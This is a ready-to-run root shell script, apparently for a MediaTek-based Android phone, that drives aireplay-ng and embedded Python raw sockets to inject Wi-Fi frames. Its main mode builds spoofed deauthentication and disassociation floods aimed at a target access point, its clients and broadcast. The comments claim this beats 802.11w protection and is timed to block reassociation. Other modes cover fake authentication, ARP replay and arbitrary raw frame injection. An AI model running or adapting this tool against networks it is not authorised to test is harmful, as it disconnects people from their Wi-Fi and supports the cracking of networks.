#!/bin/sh
# airmon-inject: 802.11 Packet Injector & Frame Transmitter
# Designed for MediaTek MT6768 (Helio G85) / Realme Narzo 30A (RMX3171)
# Works seamlessly with warped wlan_drv_gen4m.ko & standard aircrack tools.

export PATH="/data/adb/modules/mtk-aircrack-core/system/bin:/system/xbin:/data/data/com.termux/files/usr/bin:/system_ext/bin:/system/bin:/vendor/bin:$PATH"
export LD_LIBRARY_PATH="/data/data/com.termux/files/usr/lib:$LD_LIBRARY_PATH"

check_root() {
    if [ "$(id -u)" != "0" ]; then
        echo "[-] Error: airmon-inject must be run as root." >&2
        exit 1
    fi
}

check_root

# Default interface detection
MON_DEV="mon0"
if ip link show mon0 >/dev/null 2>&1; then
    MON_DEV="mon0"
elif ip link show wlan0mon >/dev/null 2>&1; then
    MON_DEV="wlan0mon"
elif ip link show radiotap0 >/dev/null 2>&1; then
    MON_DEV="radiotap0"
fi

AIREPLAY_BIN="/data/data/com.termux/files/usr/bin/aireplay-ng"
if [ ! -x "$AIREPLAY_BIN" ]; then
    AIREPLAY_BIN="$(command -v aireplay-ng 2>/dev/null)"
fi

show_help() {
    echo "============================================================"
    echo "  MediaTek 802.11 Packet Injector (RMX3171 / gen4m)"
    echo "============================================================"
    echo "Usage: airmon-inject [mode] [options]"
    echo ""
    echo "Modes:"
    echo "  -9, --test                 Test injection capability against AP"
    echo "  -0, --deauth               Transmit 802.11 Deauth (Bidirectional multi-vector)"
    echo "  -p, --plain                Transmit plain AP->Client deauth only (aireplay-ng -0)"
    echo "  -1, --fakeauth             Perform Fake Authentication with AP"
    echo "  -3, --arp                  Perform ARP Request Replay"
    echo "  -r, --raw <hex_bytes>      Send raw custom 802.11 hex frame"
    echo ""
    echo "Options:"
    echo "  -a, --bssid <mac>          Target AP BSSID / MAC address (Required for deauth/fakeauth)"
    echo "  -d, --client <mac>         Target client station MAC (Default: ff:ff:ff:ff:ff:ff)"
    echo "  -s, --source <mac>         Source MAC to spoof"
    echo "  -c, --channel <channel>    Switch channel before injecting"
    echo "  -n, --count <num>          Number of frames to transmit (Default: 10)"
    echo "  -i, --iface <dev>          Monitor interface (Default: $MON_DEV)"
    echo "  -h, --help                 Display this help message"
    echo ""
    echo "Examples:"
    echo "  airmon-inject --test"
    echo "  airmon-inject --test -a aa:43:29:83:7b:7b -c 1"
    echo "  airmon-inject --deauth -a aa:43:29:83:7b:7b -d 24:b2:b9:49:23:25 -n 15"
    echo "  airmon-inject --deauth -a aa:43:29:83:7b:7b -n 5"
    echo "============================================================"
}

if [ $# -eq 0 ]; then
    show_help
    exit 0
fi

# Parse CLI options
MODE=""
TARGET_AP=""
TARGET_CLIENT=""
SOURCE_MAC=""
CHANNEL=""
COUNT=10
RAW_HEX=""

while [ $# -gt 0 ]; do
    case "$1" in
        -9|--test|test)
            MODE="test"
            shift
            ;;
        -0|--deauth|deauth)
            MODE="deauth"
            shift
            ;;
        -p|--plain|plain)
            MODE="plain"
            shift
            ;;
        -1|--fakeauth|fakeauth)
            MODE="fakeauth"
            shift
            ;;
        -3|--arp|arp)
            MODE="arp"
            shift
            ;;
        -r|--raw|raw)
            MODE="raw"
            RAW_HEX="$2"
            shift 2
            ;;
        -a|--bssid|-b)
            TARGET_AP="$2"
            shift 2
            ;;
        -d|--client|-c-client)
            TARGET_CLIENT="$2"
            shift 2
            ;;
        -s|--source)
            SOURCE_MAC="$2"
            shift 2
            ;;
        -c|--channel)
            CHANNEL="$2"
            shift 2
            ;;
        -n|--count)
            COUNT="$2"
            shift 2
            ;;
        -i|--iface)
            MON_DEV="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            echo "[-] Unknown option: $1" >&2
            show_help
            exit 1
            ;;
    esac
done

# Ensure monitor interface is up
if ! ip link show "$MON_DEV" >/dev/null 2>&1; then
    echo "[!] $MON_DEV is not UP. Initializing monitor mode..."
    airmon-mtk start
    if ip link show mon0 >/dev/null 2>&1; then
        MON_DEV="mon0"
    elif ip link show wlan0mon >/dev/null 2>&1; then
        MON_DEV="wlan0mon"
    fi
fi

# Ensure power save is off
iw dev wlan0 set power_save off 2>/dev/null
echo "airmon_wake" > /sys/power/wake_lock 2>/dev/null

# Tune channel if specified
if [ -n "$CHANNEL" ]; then
    airmon-mtk channel "$CHANNEL" 2>/dev/null || wpa_cli -i wlan0 -p /data/vendor/wifi/wpa/sockets driver "MONITOR 1 $CHANNEL 20 0" >/dev/null 2>&1
    echo "$CHANNEL" > /data/local/tmp/airmon_channel 2>/dev/null
fi

get_tx_packets() {
    ip -s link show "$MON_DEV" | awk '/TX:/{getline; print $2}' 2>/dev/null || echo 0
}

TX_BEFORE=$(get_tx_packets)

echo "============================================================"
echo "  MediaTek 802.11 Frame Transmitter (RMX3171)"
echo "============================================================"
echo "[*] Interface:  $MON_DEV"
[ -n "$CHANNEL" ] && echo "[*] Channel:    $CHANNEL"
[ -n "$TARGET_AP" ] && echo "[*] Target AP:  $TARGET_AP"
[ -n "$TARGET_CLIENT" ] && echo "[*] Client:     ${TARGET_CLIENT:-ff:ff:ff:ff:ff:ff (Broadcast)}"
echo "[*] Initial TX: $TX_BEFORE packets sent"
echo "------------------------------------------------------------"

case "$MODE" in
    test)
        echo "[*] Running Injection / Probe-Response Test..."
        if [ -n "$TARGET_AP" ]; then
            "$AIREPLAY_BIN" -9 -D -a "$TARGET_AP" "$MON_DEV"
        else
            "$AIREPLAY_BIN" -9 -D "$MON_DEV"
        fi
        ;;
    deauth)
        if [ -z "$TARGET_AP" ]; then
            echo "[-] Error: Target AP BSSID (-a <mac>) is required for deauth mode." >&2
            exit 1
        fi

        # 1. Lock hardware RF synthesizer strictly to target channel to prevent spectral leakage
        if [ -n "$CHANNEL" ]; then
            airmon-mtk channel "$CHANNEL" 20 >/dev/null 2>&1 || wpa_cli -i wlan0 -p /data/vendor/wifi/wpa/sockets driver "MONITOR 1 $CHANNEL 20 0" >/dev/null 2>&1
        fi

        local client="${TARGET_CLIENT:-ff:ff:ff:ff:ff:ff}"
        echo "[*] Launching Enhanced Multi-Vector Deauth/Disassoc Engine..."
        echo "[*] Target AP:     $TARGET_AP"
        echo "[*] Target Client: $client"
        [ -n "$CHANNEL" ] && echo "[*] Target CH:     $CHANNEL"
        echo "[*] Transmit Vectors: Client->AP (PMF bypass), AP->Client, AP->Broadcast (Optimized, Interleaved)"
        echo "[*] Frame pacing: 1ms inter-vector gap, 2ms inter-cycle gap (prevents TX FIFO overflow on gen4m)"

        python3 -c '
import sys, socket, binascii, time

mon_if = sys.argv[1]
bssid_str = sys.argv[2].replace(":", "").replace("-", "")
client_str = sys.argv[3].replace(":", "").replace("-", "")
count = int(sys.argv[4])

bssid = binascii.unhexlify(bssid_str)
client = binascii.unhexlify(client_str)
bcast = b"\xff\xff\xff\xff\xff\xff"

# Reason Codes:
# 0x0001: Unspecified
# 0x0002: Prev auth invalid
# 0x0003: Deauth leaving BSS (Client -> AP, forces AP-side session teardown)
# 0x0004: Inactivity
# 0x0007: Class 3 frame from nonassoc STA (AP -> Client standard deauth)
# 0x0008: Disassoc leaving BSS

reasons_ap  = [b"\x07\x00", b"\x02\x00", b"\x01\x00", b"\x04\x00"]
reasons_sta = [b"\x03\x00", b"\x08\x00", b"\x01\x00"]

# Duration: 314 us (standard)
dur = b"\x3a\x01"
# Inter-vector gap: 1ms — gives gen4m TX ring time to flush without dropping
GAP = 0.001
# Inter-cycle gap: 2ms — tight enough to prevent AP/STA re-association
CYCLE_GAP = 0.002

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind((mon_if, 0))

tx_sent = 0
for i in range(count):
    # --- Vector 1 (PRIORITY): Client -> AP ---
    # Sent FIRST because this direction forces the AP to drop the client session.
    # This is the vector that works against PMF (802.11w) protected APs.
    # AP-side session teardown happens faster when triggered from the client side.
    if client != bcast:
        for r in reasons_sta:
            # Deauth: FC(c0 00) + Duration + DA(AP) + SA(Client) + BSSID(AP) + Seq(00 00) + Reason
            f_sta_d = b"\xc0\x00" + dur + bssid + client + bssid + b"\x00\x00" + r
            s.send(f_sta_d)
            tx_sent += 1
            time.sleep(GAP)

            # Disassoc: FC(a0 00)
            f_sta_a = b"\xa0\x00" + dur + bssid + client + bssid + b"\x00\x00" + r
            s.send(f_sta_a)
            tx_sent += 1
            time.sleep(GAP)

    # --- Vector 2: AP -> Client ---
    # Standard downlink deauth. Reliable against non-PMF clients.
    for r in reasons_ap:
        # Deauth: FC(c0 00) + Duration + DA(Client) + SA(AP) + BSSID(AP) + Seq(00 00) + Reason
        f_ap_d = b"\xc0\x00" + dur + client + bssid + bssid + b"\x00\x00" + r
        s.send(f_ap_d)
        tx_sent += 1
        time.sleep(GAP)

        # Disassoc: FC(a0 00)
        f_ap_a = b"\xa0\x00" + dur + client + bssid + bssid + b"\x00\x00" + r
        s.send(f_ap_a)
        tx_sent += 1
        time.sleep(GAP)

    # --- Vector 3: AP -> Broadcast ---
    # Clears all nearby unassociated STAs from AP channel.
    f_bcast = b"\xc0\x00" + dur + bcast + bssid + bssid + b"\x00\x00\x07\x00"
    s.send(f_bcast)
    tx_sent += 1

    # 2ms inter-cycle gap — prevents gen4m TX FIFO saturation,
    # keeps the AP/STA within their reassociation backoff window
    time.sleep(CYCLE_GAP)

s.close()
print(f"[+] Optimized bidirectional burst: {tx_sent} frames dispatched ({count} cycles x {tx_sent//count if count else 0} frames/cycle).")
' "$MON_DEV" "$TARGET_AP" "$client" "$COUNT"
        ;;
    plain)
        if [ -z "$TARGET_AP" ]; then
            echo "[-] Error: Target AP BSSID (-a <mac>) is required for plain deauth." >&2
            exit 1
        fi

        # Lock channel if specified
        if [ -n "$CHANNEL" ]; then
            airmon-mtk channel "$CHANNEL" 20 >/dev/null 2>&1 || wpa_cli -i wlan0 -p /data/vendor/wifi/wpa/sockets driver "MONITOR 1 $CHANNEL 20 0" >/dev/null 2>&1
        fi

        local client="${TARGET_CLIENT:-ff:ff:ff:ff:ff:ff}"
        echo "[*] Plain AP->Client Deauth via aireplay-ng..."
        echo "[*] Target AP:     $TARGET_AP"
        echo "[*] Target Client: $client"
        [ -n "$CHANNEL" ] && echo "[*] Target CH:     $CHANNEL"

        CLIENT_ARG=""
        [ -n "$TARGET_CLIENT" ] && [ "$TARGET_CLIENT" != "ff:ff:ff:ff:ff:ff" ] && CLIENT_ARG="-c $TARGET_CLIENT"
        "$AIREPLAY_BIN" -0 "$COUNT" -D -a "$TARGET_AP" $CLIENT_ARG "$MON_DEV"
        ;;
    fakeauth)
        if [ -z "$TARGET_AP" ]; then
            echo "[-] Error: Target AP BSSID (-a <mac>) is required for fakeauth mode." >&2
            exit 1
        fi
        echo "[*] Sending Fake Authentication request..."
        SRC_ARG=""
        [ -n "$SOURCE_MAC" ] && SRC_ARG="-h $SOURCE_MAC"
        "$AIREPLAY_BIN" -1 0 -D -a "$TARGET_AP" $SRC_ARG "$MON_DEV"
        ;;
    arp)
        if [ -z "$TARGET_AP" ]; then
            echo "[-] Error: Target AP BSSID (-a <mac>) is required for ARP replay." >&2
            exit 1
        fi
        echo "[*] Starting ARP Request Replay..."
        SRC_ARG=""
        [ -n "$SOURCE_MAC" ] && SRC_ARG="-h $SOURCE_MAC"
        "$AIREPLAY_BIN" -3 -D -b "$TARGET_AP" $SRC_ARG "$MON_DEV"
        ;;
    raw)
        if [ -z "$RAW_HEX" ]; then
            echo "[-] Error: Hex bytes required for raw frame mode (-r <hex>)." >&2
            exit 1
        fi
        echo "[*] Injecting raw 802.11 frame via Python AF_PACKET socket..."
        python3 -c '
import sys, socket, binascii
iface = sys.argv[1]
hex_data = sys.argv[2].replace(" ", "").replace(":", "")
pkt = binascii.unhexlify(hex_data)
count = int(sys.argv[3])
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((iface, 0))
for i in range(count):
    s.send(pkt)
s.close()
print(f"[+] Successfully injected {count} raw frame(s) into {iface}.")
' "$MON_DEV" "$RAW_HEX" "$COUNT"
        ;;
    *)
        echo "[-] No valid injection mode selected. Use -h for help." >&2
        exit 1
        ;;
esac

TX_AFTER=$(get_tx_packets)
DIFF=$(( TX_AFTER - TX_BEFORE ))
echo "------------------------------------------------------------"
echo "[+] Total TX packets after run: $TX_AFTER (Delta: +$DIFF packets transmitted by PHY)"
echo "============================================================"
